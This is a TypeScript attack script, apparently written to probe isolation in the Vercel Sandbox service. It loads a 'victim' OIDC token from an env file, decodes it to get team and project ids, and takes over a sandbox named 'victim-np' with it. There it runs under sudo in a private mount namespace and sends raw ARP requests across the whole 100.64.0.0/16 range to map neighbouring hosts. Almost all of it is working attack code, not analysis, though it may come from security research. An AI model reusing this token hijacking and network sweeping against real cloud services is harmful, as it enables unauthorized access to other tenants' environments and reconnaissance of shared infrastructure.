import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const EXPLORE = `#!/bin/bash
set +e
ip neigh show 2>&1
python3 - <<'PYEOF'
import socket, struct, time, threading
IF="eth0"
MYMAC="2e:bc:6a:de:13:92"
MYIP=socket.inet_aton("100.64.29.201")
found={}
s=socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
s.bind((IF,0))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVTIMEO, struct.pack("LL",0,400000))
def sender():
    for i in range(1,65536):
        ip=socket.inet_aton("100.64.%d.%d"%(i>>8,i&0xff))
        if ip==MYIP: continue
        pkt=struct.pack("!6s6sH", b"\\xff\\xff\\xff\\xff\\xff\\xff", MYMAC, 0x0806)
        arp=struct.pack("!HHBBH6s4s6s4s",1,0x0800,6,4,1,MYMAC,MYIP,b"\\x00\\x00\\x00\\x00\\x00\\x00",ip)
        try: s.send(pkt+arp)
        except Exception: pass
        if i%16384==0: time.sleep(0.2)
t=threading.Thread(target=sender); t.daemon=True; t.start()
end=time.time()+12
while time.time()<end:
    try: data=s.recv(4096)
    except socket.timeout: continue
    if len(data)<42: continue
    arp=data[14:42]
    if arp[0:2]==struct.pack("!H",1) and arp[6:8]==struct.pack("!H",0x0800):
        spa=socket.inet_ntoa(arp[14:18])
        sha=":".join("%02x"%b for b in arp[8:14])
        if spa not in found:
            found[spa]=sha
            print("ARP reply:",spa,sha,flush=True)
print("total:",len(found))
PYEOF
echo DONE`;

const SCRIPT = `set +e
cat > /tmp/explore18.sh <<'EXPLORE_EOF'
${EXPLORE}
EXPLORE_EOF
sudo unshare -m --propagation private bash /tmp/explore18.sh 2>&1
echo "=== rc: $? ==="
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 90_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });